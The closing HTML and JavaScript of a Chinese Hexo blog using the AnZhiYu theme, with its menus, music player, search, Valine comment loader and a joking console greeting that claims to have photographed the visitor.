anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>